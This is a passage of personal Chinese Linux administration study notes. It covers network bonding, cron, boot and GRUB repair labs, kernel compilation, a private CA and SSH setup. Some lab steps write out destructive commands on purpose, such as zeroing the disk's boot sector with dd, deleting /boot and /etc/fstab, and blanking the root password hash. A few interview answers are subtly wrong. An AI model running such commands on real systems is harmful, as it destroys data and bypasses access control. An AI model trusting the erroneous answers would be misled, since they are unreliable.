[21:01:02 root@centos7 ~]#nmcli connection 
NAME                UUID                                  TYPE      DEVICE 
eth0                5fb06bd0-0bb0-7ffb-45f1-d6edd65f3e03  ethernet  eth0   
Wired connection 1  d08846ea-eaa9-3869-a7d8-67fffefb5b02  ethernet  eth1
[21:01:16 root@centos7 ~]#cdnet #这是我起的别名 alias cdnet='cd /etc/sysconfig/network-scripts'
[21:01:23 root@centos7 network-scripts]#ls #找到自动生成的ifcfg-mybond文件
```

![1650459943218](linuxSRE.assets/1650459943218.png)

### 19.3删除bonding接口

```
#注意这个时候删除mybond0网会断，ip会变成你原本来的ip:10.0.0.7
#还有个小细节，你要到你的vmare把之前的NAT打开
[21:42:44 root@centos7 ~]#nmcli connection delete mybond0
[21:50:35 root@centos7 ~]#nmcli connection delete bond-slave-eth0
[21:50:35 root@centos7 ~]#nmcli connection delete bond-slave-eth1
```

![1650462903064](linuxSRE.assets/1650462903064.png)

### 19.4添加从属接口

```
[21:03:23 root@centos7 network-scripts]#nmcli connection add type bond-slave ifname eth1 master bond0
[21:16:55 root@centos7 network-scripts]#nmcli connection add type bond-slave ifname eth0 master bond0
[21:17:06 root@centos7 network-scripts]#nmcli connection 
NAME                UUID                                  TYPE      DEVICE 
eth0                5fb06bd0-0bb0-7ffb-45f1-d6edd65f3e03  ethernet  eth0   
Wired connection 1  d08846ea-eaa9-3869-a7d8-67fffefb5b02  ethernet  eth1   
mybond0             fb0eae39-270f-4875-9db5-873e74c0a076  bond      bond0  
bond-slave-eth0     f53e20f6-ec0b-4283-89c7-77c427649cf1  ethernet  --     
bond-slave-eth1     ffc76a9b-4178-4bec-aa65-1e4d4c5f499a  ethernet  --  	
```

![1650460840660](linuxSRE.assets/1650460840660.png)

### 19.5启动主从属接口

```
[21:25:59 root@centos7 ~]#nmcli connection up  bond-slave-eth1
#注意启动eth0的时候网会断掉，然后重连的时候网址就是10.0.0.100了
[21:25:59 root@centos7 ~]#nmcli connection up bond-slave-eth0
[21:25:59 root@centos7 ~]#nmcli connection up mybond0
[21:25:59 root@centos7 ~]#cat /proc/net/bonding/bond0 #查看主从
```

![1650461357569](linuxSRE.assets/1650461357569.png)

## 20.网桥的实现

### 20.1创建网桥

```
nmcli con add type bridge con-name br0 ifname br0
nmcli connection modify br0 ipv4.addresses 192.168.0.100/24 ipv4.method manual
nmcli con up br0
```

### 20.2加入物理网卡

```
nmcli con add type bridge-slave con-name br0-port0 ifname eth0 master br0
nmcli con add type bridge-slave con-name br0-port1 ifname eth1 master br0
nmcli con up br0-port0
nmcli con up br0-port1
```

### 20.3查看网桥配置文件

```
cat /etc/sysconfig/network-scripts/ifcfg-br0
DEVICE=br0
STP=yes
TYPE=Bridge
BOOTPROTO=static
IPADDR=192.168.0.100
PREFIX=24
cat /etc/sysconfig/network-scripts/ifcfg-br0-port0
TYPE=Ethernet
NAME=br0-port0
DEVICE=eth0
ONBOOT=yes
BRIDGE=br0
UUID=23f41d3b-b57c-4e26-9b17-d5f02dafd12d
```

### 20.4安装管理软件包

```
yum install bridge-utils
brctl show
```

### 20.5删除网桥

```
nmcli con down br0
rm /etc/sysconfig/network-scripts/ifcfg-br0*
nmcli con reload
```

## 21.面试题合集

### 21.1找到未知进程的执行程序文件路径

```
[20:54:41 root@liu ~]#ps aux k -%cpu #先查找哪个进程利用率最高
[20:54:41 root@liu ~]#ll /proc/3053/exe #找到exe执行文件查看是否病毒
```

![1650979458454](linuxSRE.assets/1650979458454.png)

### 21.2执行 cp /etc/issue /data/dir 所需要的最小权限？

```
/bin/cp 需要x权限
/etc/ 需要x权限
/etc/issue 需要r 权限
/data 需要x权限
/data/dir 需要w,x 权限
```

### 21.3Linux中的目录和文件的权限区别？

```
对文件的权限：
1、r 可使用文件查看类工具，比如：cat，可以获取其内容
2、w 可修改其内容
3、x 可以把此文件提请内核启动为一个进程，即可以执行（运行）此文件（此文件的内容必须是可执行）

对目录的权限：
1、r 可以使用ls查看此目录中文件列表
2、w 可在此目录中创建文件，也可删除此目录中的文件，而和此被删除的文件的权限无关
3、x 可以cd进入此目录，可以使用ls -l查看此目录中文件元数据（须配合r权限），属于目录的可访问的最小权限
4、X 只给目录x权限，不给无执行权限的文件x权限

注：
1、用户的最终权限，是从左向右进行顺序匹配，即，所有者，所属组，其他人，一旦匹配权限立即生效，不再向右查看其权限
2、r和w权限对root用户无效，即权限的修改不影响root用户的r和w，但会影响x
3、只要所有者，所属组或other三者之一有x权限，root就可以执行
4、文件能不能删，和所在文件夹的权限有关
```

### 21.4.11月每天的6-12点之间每隔2小时执行/app/bin/test.sh

```
0 6-12/2 * 11 * /app/bin/test.sh
```

### 21.5文件host_list.log 如下格式，请提取”.magedu.com”前面的主机名部分并写入到回到该文件中

```
[root@centos8 ~]#cat host_list.log
1 www.magedu.com
2 blog.magedu.com
3 study.magedu.com
4 linux.magedu.com
5 python.magedu.com
www
blog
study
linux
python
追加到host_list.log
#答案
[23:42:00 root@liu ~]#awk -F'[ .]' '{print $2}' host_list.log >> host_list.log
```

### 21.6有两个文件，a.txt与b.txt ，合并两个文件，并输出时确保每个数字也唯一

```
#方法一
[16:37:54 root@liu ~]#cat a.txt b.txt |sort -u
#方法二
[16:40:02 root@liu ~]#cat b.txt |uniq -u
```

### 21.7统计当前服务器状态出现的次数

```
[16:18:54 root@liu ~]#ss -tan
State      Recv-Q Send-Q Local Address:Port               Peer Address:Port              
LISTEN     0      128             *:22                          *:*                  
LISTEN     0      100     127.0.0.1:25                          *:*                  
ESTAB      0      36       10.0.0.7:22                   10.0.0.1:13061              
ESTAB      0      0        10.0.0.7:22                   10.0.0.1:13054              
LISTEN     0      128          [::]:80                       [::]:*                  
LISTEN     0      128          [::]:22                       [::]:*                  
LISTEN     0      100         [::1]:25                       [::]:*                  
LISTEN     0      128          [::]:9090                     [::]:* 
[16:19:05 root@liu ~]#ss -tan | awk 'NR!=1{state[$1]++}END{for(i in state){print i,state[i]}}'
```

![1651307154838](linuxSRE.assets/1651307154838.png)

### 21.8DNS的53/TCP和53/UDP分别是干什么的？

```
53/UDP:查询(域名解析)区域传输(主从复制)
53/TCP:只用于区域传输(主从复制)
```

### 21.9出现table full,dropping packet是什么原因？

```
[root@centos8 ~]# echo 1 > /proc/sys/net/netfilter/nf_conntrack_max
[root@centos8 ~]# tail /var/log/messages
Jul 8 10:03:53 centos8 kernel:nf_conntrack:table full,dropping packet
原因：连接数设置的太少了，应该适当调大
```

### 21.10MyISAM和InnoDB区别

```
#MyISAM 引擎特点
不支持事务
表级锁定
读写相互阻塞，写入不能读，读时不能写
只缓存索引
不支持外键约束
不支持聚簇索引
读取数据较快，占用资源较少
不支持MVCC（多版本并发控制机制）高并发
崩溃恢复性较差
MySQL5.5.5 前默认的数据库引擎
MyISAM 存储引擎适用场景
只读（或者写较少）
表较小（可以接受长时间进行修复操作）
MyISAM 引擎文件
tbl_name.frm 表格式定义
tbl_name.MYD 数据文件
tbl_name.MYI 索引文件


#InnoDB引擎特点
行级锁
支持事务，适合处理大量短期事务
读写阻塞与事务隔离级别相关
可缓存数据和索引
支持聚簇索引
崩溃恢复性更好
支持MVCC高并发
从MySQL5.5后支持全文索引
从MySQL5.5.5开始为默认的数据库引擎
```

### 21.11InnoDB中一颗的B+树可以存放多少行数据？

```
假设定义一颗B+树高度为2，即一个根节点和若干叶子节点。那么这棵B+树的存放总行记录数=根节点指针数*
单个叶子记录的行数。这里先计算叶子节点，B+树中的单个叶子节点的大小为16K，假设每一条目为1K，那么
记录数即为16(16k/1K=16)，然后计算非叶子节点能够存放多少个指针，假设主键ID为bigint类型，那么
长度为8字节，而指针大小在InnoDB中是设置为6个字节，这样加起来一共是14个字节。那么通过页大小/(主 键ID大小+指针大小），即16384/14=1170个指针，所以一颗高度为2的B+树能存放18720条这样的记录。
根据这个原理就可以算出一颗高度为3的B+树可以存放1170*1170*16=21902400条记录。所以在InnoDB中 B+树高度一般为2-3层，它就能满足千万级的数据存储
```

![1653397141840](linuxSRE.assets/1653397141840.png)

### 21.12造成mysql主从不一致的原因

```
#1.造成主从不一致的原因
主库binlog格式为Statement，同步到从库执行后可能造成主从不一致。
主库执行更改前有执行set sql_log_bin=0，会使主库不记录binlog，从库也无法变更这部分数据。
从节点未设置只读，误操作写入数据
主库或从库意外宕机，宕机可能会造成binlog或者relaylog文件出现损坏，导致主从不一致
主从实例版本不一致，特别是高版本是主，低版本为从的情况下，主数据库上面支持的功能，从数
据库上面可能不支持该功能
MySQL自身bug导致


#2.主从不一致修复方法
将从库重新实现
虽然这也是一种解决方法，但是这个方案恢复时间比较慢，而且有时候从库也是承担一部分的查询
操作的，不能贸然重建。
使用percona-toolkit工具辅助
PT工具包中包含pt-table-checksum和pt-table-sync两个工具，主要用于检测主从是否一致以及修
复数据不一致情况。这种方案优点是修复速度快，不需要停止主从辅助，缺点是需要知识积累，需
要时间去学习，去测试，特别是在生产环境，还是要小心使用
关于使用方法，可以参考下面链接：https://www.cnblogs.com/feiren/p/7777218.html
手动重建不一致的表
在从库发现某几张表与主库数据不一致，而这几张表数据量也比较大，手工比对数据不现实，并且
重做整个库也比较慢，这个时候可以只重做这几张表来修复主从不一致这种方案缺点是在执行导入期间需要暂时停止从库复制，不过也是可以接受的


#3.如何避免主从不一致
主库binlog采用ROW格式
主从实例数据库版本保持一致
主库做好账号权限把控，不可以执行set sql_log_bin=0
从库开启只读，不允许人为写入
定期进行主从一致性检验
```

## 22.正在访问文件被删复原

```
#注意：这个复原只能是适用于当前文件正在被别的进程访问的时候误删了
[23:34:12 root@liu ~]#rm -rf /var/log/messages #比如删除的这个文件
[23:33:45 root@liu ~]#lsof|grep delete
rsyslogd  3322         root    7w      REG                8,2    142980  134327663 /var/log/messages (deleted)
in:imjour 3322 3820    root    7w      REG                8,2    142980  134327663 /var/log/messages (deleted)
rs:main   3322 3821    root    7w      REG                8,2    142980  134327663 /var/log/messages (delete）
[23:38:11 root@liu ~]#ll /proc/3322/fd #这里的3322是进程号
[23:42:00 root@liu ~]#cat /proc/3322/fd/7 > /var/log/messages #进行恢复
```

![1650987818594](linuxSRE.assets/1650987818594.png)

## 23.作业管理

### 23.1流程图

![1651032241462](linuxSRE.assets/1651032241462.png)

### 23.2并行运行

```
13:21:57 root@liu ~]#f1.sh&f2.sh&f3.sh& #表示后台运行
#案例：并行ping通254台主机
-c1 ping一次
-W1 超时时间1s
###################################################################
# File Name: scan_host.sh
# Author: liusenbiao
# mail: 1805336068@qq.com
# Created Time: Wed 27 Apr 2022 01:36:43 PM CST
#=============================================================
#!/bin/bash
net=10.0.0

for i in {1..254};do
   {   
    ping -c1 -W1 $net.$i &> /dev/null && echo $net.$i is up || echo $net.$i is down   }&

done
wait #结束后主动退出
```

![1651038662566](linuxSRE.assets/1651038662566.png)

## 24.计划任务

### 24.1环境准备

```
#需要实现邮件通知,必须安装并启动邮件服务
[13:55:24 root@liu ~]#yum -y install postfix
[14:14:15 root@liu ~]##systemctl enable --now postfix
```

### 24.2一次性任务

- **未来的某时间点执行一次任务**
- **at** 
- **指定时间点，执行一次性任务**
- **batch 系统自行选择空闲时间去执行此处指定的任务**
- **周期性运行某任务**
- **cron**

```
at [option] TIME

-V 显示版本信息
-t time   时间格式 [[CC]YY]MMDDhhmm[.ss] 
-l 列出指定队列中等待运行的作业；相当于atq
-d N 删除指定的N号作业；相当于atrm
-c N 查看具体作业N号任务
-f file 指定的文件中读取任务
-m 当任务被完成之后，将给用户发送邮件，即使没有标准输出
HH:MM [YYYY-mm-dd]
noon, midnight, teatime（4pm）,tomorrow
now+#{minutes,hours,days, OR weeks}

[14:31:20 root@liu ~]#systemctl start atd #先启动atd服务
[14:34:37 root@liu ~]#systemctl status atd #查看启动状态
```

 ![1651041453940](linuxSRE.assets/1651041453940.png)

```
#1.at执行的一次性任务是临时的，关机就没了
[18:49:31 root@liu ~]#at -l #查看任务列表
[18:50:21 root@liu ~]#at 18:53 #设置时间
at> echo at job is running
at> <EOT>
job 1 at Wed Apr 27 18:53:00 2022
[18:53:40 root@liu ~]#mail #发的echo命令是以邮件的方式发送给你
[18:53:40 root@liu ~]#at -d 作业编号 #删除某个定时任务
#2.禁止某个用户创建计划任务
#/etc/at.{allow,deny} 控制用户是否能执行at任务
#白名单：/etc/at.allow 默认不存在，只有该文件中的用户才能执行at命令
#黑名单：/etc/at.deny 默认存在，拒绝该文件中用户执行at命令，而没有在#at.deny 文件中的使用
#者则可执行
#如果两个文件都不存在，只有 root 可以执行 at 命令
[18:53:40 root@liu ~]#vim /etc/at.deny #默认空文件
写入wang
```

![1651057382164](linuxSRE.assets/1651057382164.png)

![1651058151144](linuxSRE.assets/1651058151144.png)

### 24.3周期性任务cron

```
#1.查看cron的格式
[19:20:26 root@liu ~]#cat /etc/crontab 
# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name  command to be executed

#示例：
*/10 * * * * #每10分钟执行一次
0 * * * * #每小时整执行 0点..1点..
* * 1，10，20 * * #每个月的1号，10号，20号
* * 1-5，10，20 * * #每个月的1号到5号，10号，20号
* * 1-5，10，20 * 0，6 #每个月的1号到5号，10号，20号或者星期六星期日
* 2-10/2 * * * #从2点到10点每两个小时执行一次
用;隔开执行多个任务

#2.创建计划任务
crontab [-u user] [-l | -r | -e] [-i]
-l 列出所有任务
-e 编辑任务
-r 移除所有任务
-i 同-r一同使用，以交互式模式移除指定任务
-u user 指定用户管理cron任务,仅root可运行
控制用户执行计划任务：
/etc/cron.{allow,deny}
范例：修改默认的cron的文本编辑工具
[20:10:21 root@liu ~]#chmod +x /usr/local/bin/test.sh #给脚本执行权限
[20:07:17 root@liu ~]#crontab -e #创建计划任务
esc模式下r!echo $PATH添加路径
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/sbin:/root/bin
* * * * *代表每分每秒执行 + 你写的脚本
[20:10:21 root@liu ~]#mail #查看邮件
[20:10:21 root@liu ~]#rm -f /var/spool/mail/root #删除邮件

#运行一个文件夹下的所有可执行脚本
[20:41:52 root@liu ~]#run-parts /data/
```

![1651061668525](linuxSRE.assets/1651061668525.png)

## 25.Linux启动流程

### 25.1CentOS 6启动流程

http://s4.51cto.com/wyfs02/M02/87/20/wKiom1fVBELjXsvaAAUkuL83t2Q304.jpg

![1651309445148](linuxSRE.assets/1651309445148.png)

### 25.2grub故障修复

#### 25.2.1破坏grub第1阶段

```
#把sda全446个字节全部清0
[19:30:34 root@liu ~]#dd if=/dev/zero of=/dev/sda bs=1 count=446
#进入救援模式下
sh-4.2#chroot /mnt/sysimage #切换根
#centos 6是grub-install /dev/sda
bash-4.2#grub2 install /dev/sda #注意这是针对centos 7
[19:38:19 root@liu ~]#hexdump -C -n 512 /dev/sda -v
```

#### 25.2.2破坏grub第2阶段

```
#直接破坏grub2的grub.config
[19:08:16 root@liu ~]#rm -rf /boot/grub2
#进入救援模式下
sh-4.2#chroot /mnt/sysimage #切换根
#centos 6是grub-install /dev/sda
bash-4.2#grub2 install /dev/sda #注意这是针对centos 7
#这个编写配置文件是centos6上的恢复 centos7没用
bash-4.2#vim /boot/grub2/grub.conf
```

![1651319939813](linuxSRE.assets/1651319939813.png)

#### 25.2.3一分钟破解密码

```
#方法一：
#1.先切换路径
sh-4.2#chroot /mnt/sysimage/
#2.进入存放密码的路径下
bash-4.2# vim /etc/shadow
#3.把root的密文修改即可
root::19088:0:99999:7:::
#4.按wq!进行退出

#方法二：
启动时任意键暂停启动
按e键进入编辑模式
将光标移动linux 开始的行，添加内核参数rd.break
按ctrl-x启动
mount –o remount,rw /sysroot
chroot /sysroot
passwd root
```

![1651375062280](linuxSRE.assets/1651375062280.png)

### 25.3rm -rf /boot/* 和 /etc/fstab 故障恢复

```
#实验
[22:50:06 root@liu ~]#rm -rf /boot/* #删除内核等配置文件
[22:52:56 root@liu ~]#rm -rf /etc/fstab #删除挂载分区

#1.进入救援模式，先找回文件系统，修复/etc/fstab
#这个很重要 查看分区和文件系统对应关系，如果对应关系写错 就会出现====================一长串这样子的字符
sh-4.2# blkid 
sh-4.2# mkdir /mnt/rootfs
sh-4.2# mount /dev/sda2 mnt/rootfs #找到小型根
sh-4.2# ls /mnt/rootfs
sh-4.2# vi /mnt/rootfs/etc/fstab
#编写如下内容
#这里巨坑的一点就是你的文件系统名称一定要和sda分区一一对应
/dev/sda1  /boot  ext4  defaults 0 0
/dev/sda2  /      xfs   defaults 0 0
/dev/sda3  swap   swap  defaults 0 0 #可写可不写
sh-4.2#sync;exit; 

#重启再次进入救援模式
#2.修复boot
sh-4.2# chroot /mnt/sysimage/
bash-4.2# mount /dev/sr0 /mnt
#安装内核
#centos7
bash-4.2# rpm -ivh /mnt/Packages/kernel-3.10.0-1160.e17.X86_64.rpm --force
#centos8
bash-4.2# rpm -ivh /mnt/BaseOS/Packages/kernel-core-4.18.0-147.el8.x86_64.rpm --force
#修复grub
bash-4.2# grub2-install /dev/sda
#生成grub.cfg文件
#注意这个命令是针对centos7的，centos6需要手写配置文件
bash-4.2# grub2-mkconfig -o /boot/grub2/grub.cfg
sh-4.2#sync;exit; 
```

![1651460857674](linuxSRE.assets/1651460857674.png)

### 25.4循环重启故障修复

```
[10:41:53 root@liu ~]#systemctl set-default reboot.target  #这就是设置循环重启
```

![1651546424007](linuxSRE.assets/1651546424007.png)

![1651546476739](linuxSRE.assets/1651546476739.png)

![1651546968379](linuxSRE.assets/1651546968379.png)

![1651547277397](linuxSRE.assets/1651547277397.png)

### 25.5开机自动运行脚本

```
#在rc.local里面设置开机启动项目
#1.先要给这个文件加上执行权限
[22:06:25 root@liu ~]#chmod +x /etc/rc.d/rc.local
#2.随便写个脚本测试一下
[22:07:16 root@liu data]#vim test_local.sh
touch /data/test_local.txt
#给你自己的写的脚本加上执行权限
[22:09:24 root@liu data]#chmod +x test_local.sh
[22:06:25 root@liu ~]#vim /etc/rc.d/rc.local
touch /var/lock/subsys/local
/data/test_local.sh #这个是你自己要开机启动的脚本
[22:06:25 root@liu ~]#reboot
```

![1651415381035](linuxSRE.assets/1651415381035.png)

### 25.6编译安装内核

#### 25.6.1预备工作

```
案例：编译内核让linux支持真实的物理磁盘上的文件系统ntfs
1.先在Windows上新加卷
先压缩卷，然后再添加简单卷一路确定即可,默认是ntfs的文件系统
2.VMware添加添加硬盘，点击使用物理磁盘，确定，在点击使用单个分区，勾选上你自己在电脑上划分的分区，后序无脑下一步即可！
3.在www.kernel.org官网上下载最新版本的内核
4.在VMware上把你的内存内核都调到你主机能支持的最大上限，因为这个实验非常的耗费时间
```

**1.先在Windows上新加卷**

![1651479534164](linuxSRE.assets/1651479534164.png)

**2.VMware添加添加硬盘**

![1651479954681](linuxSRE.assets/1651479954681.png)

![1651479988687](linuxSRE.assets/1651479988687.png)

![1651480044393](linuxSRE.assets/1651480044393.png)

**3.下载最新版本的内核**

![1651480291340](linuxSRE.assets/1651480291340.png)

**4.VMware上设置内存内核**

![1651481468632](linuxSRE.assets/1651481468632.png)

#### 25.6.2开始编译安装

```
[15:54:39 root@liu ~]#lsblk -f #先产看是否硬盘添加成功
[15:54:39 root@liu ~]#yum -y install gcc make ncurses-devel flex bison openssl-devel elfutils-libelf-devel            
#然后把下载好的内核源码拖到xshell里面
[16:39:20 root@liu ~]#tar xvf linux-5.17.5.tar.xz -C /usr/local/src  #解压缩到/usr/local/src下
[16:42:30 root@liu ~]#cd /usr/bin/src
[16:43:08 root@liu src]#ls
linux-5.17.5
[16:51:53 root@liu src]#cd linux-5.17.5/
[16:52:13 root@liu linux-5.17.5]#cp /boot/config-3.10.0-1160.el7.x86_64 .config
[16:53:11 root@liu linux-5.17.5]#vim .config
#修改下面的三行
先vim上搜索/CONFIG_MODULE_SIG
CONFIG_MODULE_SIG=y #注释掉，不然编译需要签名
CONFIG_DEBUG_INFO=y #注释掉
CONFIG_SYSTEM_TRUSTED_KEYS=""
[17:12:47 root@liu linux-5.17.5]#make menuconfig
```

![1651485558644](linuxSRE.assets/1651485558644.png)

![1651485615508](linuxSRE.assets/1651485615508.png)

![1651485702923](linuxSRE.assets/1651485702923.png)

![1651485760238](linuxSRE.assets/1651485760238.png)

![1651485884294](linuxSRE.assets/1651485884294.png)

![1651486034636](linuxSRE.assets/1651486034636.png)

```
[18:07:38 root@liu linux-5.17.5]#grep -i ntfs .config
#出现下面这三个表示已经设置成功了！！
CONFIG_NTFS_FS=m
CONFIG_NTFS_DEBUG=y
CONFIG_NTFS_RW=y
[19:43:08 root@liu linux-5.17.5]#make -j 8
#在编译内核的时候出现了如下的错误
```

![1651495256932](linuxSRE.assets/1651495256932.png)

```
#解决方案如下：
[20:36:45 root@liu linux-5.17.5]#yum search libelf
[20:36:45 root@liu linux-5.17.5]#yum -y install elfutils-libelf-devel.x86_64 #安装这个包即可解决

#最后两个步骤！！make modules_install和make install
[20:36:45 root@liu linux-5.17.5]#make modules_install
[21:41:35 root@liu linux-5.17.5]#ls /lib/modules
#5.17.5-liu-linux是自动生成的内核module文件
#3.10.0-1160.el7.x86_64  5.17.5-liu-linux
[21:42:30 root@liu linux-5.17.5]#make install
sh ./arch/x86/boot/install.sh 5.17.5-liu-linux 
\arch/x86/boot/bzImage System.map "/boot"
[21:44:22 root@liu linux-5.17.5]#reboot
#只有读权限
[21:44:22 root@liu linux-5.17.5]#mount /dev/sdb2 /mnt
```

![1651499540310](linuxSRE.assets/1651499540310.png)

#### 25.6.3卸载内核

```
[13:53:59 root@liu ~]#cd /usr/local/src/
[13:56:05 root@liu src]#rm -rf *
[13:56:56 root@liu src]#rm -rf /lib/modules/5.17.5-liu-linux/
[13:59:53 root@liu src]#ls /boot #查看你的内核版本名
[14:00:00 root@liu src]#find /boot -name "*5.17.5*" -delete 
[14:10:54 root@liu ~]#grub2-mkconfig -o /boot/grub2/grub.cfg
```

![1651558446648](linuxSRE.assets/1651558446648.png)

## 26.升级gcc编译器

```
[15:54:39 root@liu ~]#yum -y install centos-release-scl
[15:54:39 root@liu ~]#yum install devtoolset-9-gcc* -y
[15:54:39 root@liu ~]#scl enable devtoolset-9 bash
#写入/etc/profile使其永久生效
[15:54:39 root@liu ~]#echo "source /opt/rh/devtoolset-9/enable" >>/etc/profile
```

![1651485257054](linuxSRE.assets/1651485257054.png)

## 27.Linux根据端口号查看被占用的服务

```
#查看端口号
[23:06:48 root@liu ~]#ss -ntl
#1.根据端口号查看pid
[23:02:41 root@liu ~]#netstat -tunlp | grep 81
tcp        0      0 0.0.0.0:81              0.0.0.0:*               LISTEN      16397/nginx: master 
tcp6       0      0 :::81                   :::*                    LISTEN      16397/nginx: master 

#2.根据pid查看服务名称
[23:04:20 root@liu ~]#ps -ef | grep 16397	

#3.关闭服务
[23:04:52 root@liu ~]#systemctl stop nginx.service

#3.开启服务
[23:09:46 root@liu ~]#systemctl enable --now nginx.service #开机启动+激活

#4.关闭一个端口所占用的所有程序
[root@paranoid ~]# $ lsof -i :80|grep -v "PID"|awk '{print "kill -9",$2}'|sh
```

![1651504104596](linuxSRE.assets/1651504104596.png)

## 28.加密和安全

### 28.1搭建私有CA

```
#1.创建CA所需要的文件
#生成证书索引数据库文件
[13:06:01 root@liu ~]#touch /etc/pki/CA/index.txt 
#指定第一个颁发证书的序列号
[13:06:01 root@liu ~]#echo 01 > /etc/pki/CA/serial
#centos8才需要创建，centos7上默认有这个
[13:06:01 root@liu ~]#mkdir /etc/pki/CA{certs,crl,newcerts,private} -p

#2.生成CA私钥
[15:47:55 root@liu ~]#cd /etc/pki/CA/
#umask的计算规则是：
1.如果是文件，用666去减
2.如果是文件夹，用777去减
减完后是级数就加1，是偶数就保留
[15:48:30 root@liu CA]#umask 066; openssl genrsa -out private/cakey.pem 2048;

#3.生成CA自签名证书
[16:04:51 root@liu CA]#openssl req -new -x509 -key /etc/pki/CA/private/cakey.pem -days 3650 -out /etc/pki/CA/cacert.pem
#Country Name (2 letter code) [XX]:CN #必须一致
#State or Province Name (full name) []:jiangsu #必须一致
#Locality Name (eg, city) [Default City]:taizhou
#Organization Name (eg, company) [Default Company Ltd]:liusenbiao     #必须一致
#Organizational Unit Name (eg, section) []:it
#Common Name (eg, your name or your server's hostname) []:www.liusenbiao.cn

#注意也可以openssl.cnf修改配置使必须一致的变得可以不一致
policy          = policy_match改成policy_anything
```

![1651653435924](linuxSRE.assets/1651653435924.png)

![1651672777439](linuxSRE.assets/1651672777439.png)

### 28.2用户生成私钥和证书申请

```
[16:39:01 root@liu ~]#mkdir /data/app1
[16:39:11 root@liu ~]#cd  /data/app1
[16:41:00 root@liu app1]#umask 066; openssl genrsa -out /data/app1/app1.key 2048; #创建app1的私钥文件
#生成证书申请文件
#Country Name (2 letter code) [XX]:CN
#State or Province Name (full name) []:jiangsu      
#Locality Name (eg, city) [Default City]:taizhou
#Organization Name (eg, company) [Default Company Ltd]:liusenbiao
#Organizational Unit Name (eg, section) []:sale
#Common Name (eg, your name or your server's hostname) []:www.liusenbiao.cn
#Email Address []: 
[16:49:25 root@liu app1]#ll
total 8
-rw------- 1 root root 1017 May  4 16:49 app1.csr
-rw------- 1 root root 1679 May  4 16:41 app1.key
```

### 28.3颁发证书

```
[16:54:33 root@liu app1]#openssl ca -in /data/app1/app1.csr  -out /etc/pki/CA/certs/app1.crt -days 1000
[17:03:24 root@liu app1]#tree /etc/pki/CA
#验证证书的有效性
[17:03:32 root@liu app1]#openssl ca -status 01 
```

![1651656382071](linuxSRE.assets/1651656382071.png)

![1651679113113](linuxSRE.assets/1651679113113.png)

### 28.4吊销证书

```
[22:01:56 root@liu ~]#cd /etc/pki/CA/
[22:02:12 root@liu CA]#cat index.txt
V	250128085550Z		01	unknown	/C=CN/ST=jiangsu/O=liusenbiao/OU=sale/CN=www.liusenbiao.cn
[22:02:12 root@liu CA]#openssl ca -revoke /etc/pki/CA/newcerts/01.pem
[17:03:32 root@liu app1]#openssl ca -status 01 
#V变成了R
```

### 28.5生成证书吊销列表文件

```
[22:33:13 root@liu CA]#echo 01 > /etc/pki/CA/crlnumber
[22:39:49 root@liu CA]#openssl ca -gencrl -out /etc/pki/CA/crl.pem
[22:40:17 root@liu CA]#sz /etc/pki/CA/crl.pem
```

![1651675519097](linuxSRE.assets/1651675519097.png)

28.6一键搭建CA脚本

```
#!/bin/bash
#
#********************************************************************
#Author:                liusenbiao
#QQ:                    1805336068      
#Date:                  2022-05-04
#FileName：             certificate.sh
#********************************************************************
CA_SUBJECT="/O=liusenbiao/CN=ca.liusenbiao.cn"
SUBJECT="/C=CN/ST=jiangsu/L=taizhou/O=magedu/CN=www.liusenbiao.cn"
SERIAL=34
EXPIRE=202002
FILE=liusenbiao.org

openssl req  -x509 -newkey rsa:2048 -subj $CA_SUBJECT -keyout ca.key -nodes -days 202002 -out ca.crt

openssl req -newkey rsa:2048 -nodes -keyout ${FILE}.key  -subj $SUBJECT -out ${FILE}.csr

openssl x509 -req -in ${FILE}.csr  -CA ca.crt -CAkey ca.key -set_serial $SERIAL  -days $EXPIRE -out ${FILE}.crt

chmod 600 ${FILE}.key ca.key
```

![1651676942809](linuxSRE.assets/1651676942809.png)

### 28.6ssh客户端配置文件

```
#ssh客户端配置文件： /etc/ssh/ssh_config
##StrictHostKeyChecking ask
##首次登录不显示检查提示
#修改StrictHostKeyChecking 从ask到no
[15:48:31 root@liu ~]#vim /etc/ssh/sshd_config
#优化服务器配置
UseDNS yes #提高速度可改为no
GSSAPIAuthentication yes #提高速度可改为no
#修改服务器端口号
[root@liuwp ~]# vim /etc/ssh/sshd_config
# semanage port -a -t ssh_port_t -p tcp #PORTNUMBER
Port 1314 在这里修改端口号
[root@liuwp ~]# systemctl restart sshd
```

![1651737142253](linuxSRE.assets/1651737142253.png)

### 28.7ssh密钥登录

![1651739648823](linuxSRE.assets/1651739648823.png)

```
#1.生成公钥私钥对
[15:45:21 root@liu ~]#ssh-keygen
#2.把公钥拷贝到远程主机上，在远程主机下的.ssh下生成authorized_keys文件
#我的远程主机ip:39.99.227.252,端口号1314
[15:57:16 root@liu ~]#ssh-copy-id -i .ssh/id_rsa.pub 39.99.227.252 -p 1314
3.配置完成，可以传输文件了
[16:25:58 root@liu ~]#scp -P 1314 hello.c 39.99.227.252:~/
hello.c                                             100%   63     0.6KB/s   00:00
#还可以直接远程连接不要输入密码
[17:40:24 root@liu data]#ssh -p 1314 www.liusenbiao.cn
Last login: Thu May  5 17:21:05 2022 from 223.87.230.45

Welcome to Alibaba Cloud Elastic Compute Service !
```

![1651740270890](linuxSRE.assets/1651740270890.png)

### 28.8分配sudo权限

```
[16:42:08 root@liu ~]#vim /etc/sudoers
sudoers 授权规则格式：
#1.允许单个用户进行某些root权限
用户 登入主机=(代表用户) 命令
user host=(runas) command
#案例 让小华用户以root的身份执行mount命令
[17:26:25 xiaohua@liu ~]$which mount
/bin/mount

#2.允许单个组的所有用户进行某些root权限
#加入配置文件wheel组里想干嘛就干嘛
[18:09:01 xiaohua@liu ~]$id xiaohua
uid=1002(xiaohua) gid=1003(xiaohua) groups=1003(xiaohua)
[18:14:03 root@liu ~]#gpasswd -a xiaohua wheel
uid=1002(xiaohua) gid=1003(xiaohua) groups=1003(xiaohua),10(wheel)
#把root变成普通用户
[18:18:21 root@liu ~]#vim /etc/passwd


#3.在生产环境，一般不直接放到sudoers里面
#一般都是放在sudoers.d文件夹下
[19:10:29 root@liu ~]#vim /etc/sudoers.d/test
#xiaoming ALL=  sudoedit
[19:12:25 root@liu sudoers.d]#chmod 440 test
